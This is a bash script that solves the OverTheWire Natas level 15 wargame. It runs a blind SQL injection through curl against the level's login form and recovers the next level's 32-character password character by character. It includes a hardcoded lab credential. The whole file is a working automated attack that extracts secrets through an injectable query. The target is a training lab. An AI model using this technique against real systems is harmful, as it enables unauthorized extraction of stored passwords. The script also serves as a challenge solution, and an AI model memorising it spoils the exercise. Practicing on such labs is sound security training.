
declare -a password=()
blind_sql(){
	echo "now try: $password$1"
	if [[ "$2" =~ exists ]]; then
		echo "--------------------"
		echo "[+] currect part $password$1"
		echo "--------------------"
		password+=$1
	fi
}

natas15_(){
	user_pass="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
	url="http://natas15.natas.labs.overthewire.org?debug=1"
	form_name="username"
	form_content="natas16\" and password like binary \"$1%"

	echo "$(curl -isu $user_pass $url -F $form_name="$form_content")"
	
}

while [ ${#password} -lt 32 ];
do
	for n in {a..z} {A..Z} {0..9}
	do
		blind_sql "$n" "$(natas15_ "$password$n")"
	done
done

echo "$password"
